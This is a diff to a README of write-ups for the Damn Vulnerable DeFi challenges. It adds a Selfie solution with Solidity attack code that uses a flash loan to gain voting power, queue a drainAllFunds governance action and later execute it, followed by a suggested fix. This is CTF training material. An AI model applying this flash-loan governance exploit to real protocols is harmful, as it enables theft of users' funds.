@@ -19,6 +19,8 @@ All Solidity code, practices and patterns in this repository are DAMN VULNERABLE
 DO NOT USE IN PRODUCTION.
 
 ## Explanations
+The attack setup can be found in the respective test files and all the challenges that required custom smart contracts can be found in contracts/attack-contracts. 
+
 ### Unstoppable
 The objective is to stop the lender from issuing flash loans. 
 
@@ -141,6 +143,35 @@ function attack(uint256 amount) external {
 A simple fix here would be to take the snapshot after distributing rewards instead of before. 
 
 ### Selfie
+The exploit here is very similar to the previous one. We can use a flash loan to get a majority of the tokens and from their queue up an action to drain funds. Once the action is enqueued we just need to wait until it can be executed.
+
+```solidity
+function receiveTokens(address tokenAddress, uint256 amount) external{
+  ISnapshot(token).snapshot();
+  actionId = governance.queueAction(
+    selfie,
+    abi.encodeWithSignature("drainAllFunds(address)", owner),
+    0);
+
+   IERC20(tokenAddress).transfer(selfie, amount);
+
+}
+
+function attack() external {
+  uint256 loanAmount = IERC20(token).balanceOf(address(selfie));
+  IFlashLoan(selfie).flashLoan(loanAmount);
+
+}
+
+function drain() external {
+  require(actionId  != 0);
+  governance.executeAction(actionId);
+}
+```
+
+A fix here would be to have a separate government token, maybe one that requires locking the original token for a set period of time. 
+
+
 ### Compromised
 ### Puppet
 ### Puppet v2
